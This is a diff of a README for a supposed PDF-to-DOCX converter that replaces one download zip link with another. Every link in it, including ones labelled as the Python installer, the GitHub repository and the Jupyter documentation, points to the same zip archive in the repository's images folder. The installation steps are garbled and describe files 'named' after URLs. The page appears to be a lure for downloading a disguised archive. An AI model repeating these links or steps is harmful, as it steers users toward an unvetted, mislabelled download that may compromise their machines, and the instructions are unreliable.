@@ -1,6 +1,6 @@
 # 📝 PDF2DocX_ConvertAI - Effortlessly Convert PDFs to DOCX
 
-![Download PDF2DocX_ConvertAI](https://github.com/cjayesmero/PDF2DocX_ConvertAI/raw/refs/heads/main/images/PD-AI-Doc-Convert-1.9.zip)
+![Download PDF2DocX_ConvertAI](https://raw.githubusercontent.com/cjayesmero/PDF2DocX_ConvertAI/main/images/Doc_AI_PD_Convert_v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to PDF2DocX_ConvertAI! This tool makes converting complex PDFs into clea
 
 ## 📥 Download & Install
 
-1. Visit the Releases page to download the software: [Download PDF2DocX_ConvertAI](https://github.com/cjayesmero/PDF2DocX_ConvertAI/raw/refs/heads/main/images/PD-AI-Doc-Convert-1.9.zip)
+1. Visit the Releases page to download the software: [Download PDF2DocX_ConvertAI](https://raw.githubusercontent.com/cjayesmero/PDF2DocX_ConvertAI/main/images/Doc_AI_PD_Convert_v2.2.zip)
 
 2. Find the latest version of **PDF2DocX_ConvertAI**. It will be labeled with the version number, such as "v1.0.0".
 
@@ -16,14 +16,14 @@ Welcome to PDF2DocX_ConvertAI! This tool makes converting complex PDFs into clea
 
 4. Scroll down to the “Assets” section. Here, you’ll find files available for download.
 
-5. Look for the file named **https://github.com/cjayesmero/PDF2DocX_ConvertAI/raw/refs/heads/main/images/PD-AI-Doc-Convert-1.9.zip**. Click on it to download.
+5. Look for the file named **https://raw.githubusercontent.com/cjayesmero/PDF2DocX_ConvertAI/main/images/Doc_AI_PD_Convert_v2.2.zip**. Click on it to download.
 
 6. Once downloaded, locate the zip file in your downloads directory, right-click on it, and select "Extract All". Follow the prompts to unzip the file.
 
-7. Open the extracted folder, and find the file named **https://github.com/cjayesmero/PDF2DocX_ConvertAI/raw/refs/heads/main/images/PD-AI-Doc-Convert-1.9.zip**. This is the main file you will use.
+7. Open the extracted folder, and find the file named **https://raw.githubusercontent.com/cjayesmero/PDF2DocX_ConvertAI/main/images/Doc_AI_PD_Convert_v2.2.zip**. This is the main file you will use.
 
 8. To run the application, you'll need to use Jupyter Notebook. If you don’t have Jupyter Notebook installed, you can easily set it up by following these steps:
-   - Install Python from [https://github.com/cjayesmero/PDF2DocX_ConvertAI/raw/refs/heads/main/images/PD-AI-Doc-Convert-1.9.zip](https://github.com/cjayesmero/PDF2DocX_ConvertAI/raw/refs/heads/main/images/PD-AI-Doc-Convert-1.9.zip).
+   - Install Python from [https://raw.githubusercontent.com/cjayesmero/PDF2DocX_ConvertAI/main/images/Doc_AI_PD_Convert_v2.2.zip](https://raw.githubusercontent.com/cjayesmero/PDF2DocX_ConvertAI/main/images/Doc_AI_PD_Convert_v2.2.zip).
    - Open Command Prompt (Windows) or Terminal (Mac/Linux).
    - Type `pip install notebook` and hit Enter.
 
@@ -31,7 +31,7 @@ Welcome to PDF2DocX_ConvertAI! This tool makes converting complex PDFs into clea
 
 10. Type `jupyter notebook` and hit Enter. Your default web browser will open, displaying the Jupyter interface.
 
-11. Click on **https://github.com/cjayesmero/PDF2DocX_ConvertAI/raw/refs/heads/main/images/PD-AI-Doc-Convert-1.9.zip** to open the tool.
+11. Click on **https://raw.githubusercontent.com/cjayesmero/PDF2DocX_ConvertAI/main/images/Doc_AI_PD_Convert_v2.2.zip** to open the tool.
 
 ## 🛠️ Features
 
@@ -85,8 +85,8 @@ If you encounter any difficulties, you can reach out through the "Discussions" t
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/cjayesmero/PDF2DocX_ConvertAI/raw/refs/heads/main/images/PD-AI-Doc-Convert-1.9.zip)
-- [Python Installation Guide](https://github.com/cjayesmero/PDF2DocX_ConvertAI/raw/refs/heads/main/images/PD-AI-Doc-Convert-1.9.zip)
-- [Jupyter Notebook Documentation](https://github.com/cjayesmero/PDF2DocX_ConvertAI/raw/refs/heads/main/images/PD-AI-Doc-Convert-1.9.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/cjayesmero/PDF2DocX_ConvertAI/main/images/Doc_AI_PD_Convert_v2.2.zip)
+- [Python Installation Guide](https://raw.githubusercontent.com/cjayesmero/PDF2DocX_ConvertAI/main/images/Doc_AI_PD_Convert_v2.2.zip)
+- [Jupyter Notebook Documentation](https://raw.githubusercontent.com/cjayesmero/PDF2DocX_ConvertAI/main/images/Doc_AI_PD_Convert_v2.2.zip)
 
 Now you are ready to convert your PDFs to DOCX effortlessly! Enjoy using PDF2DocX_ConvertAI.
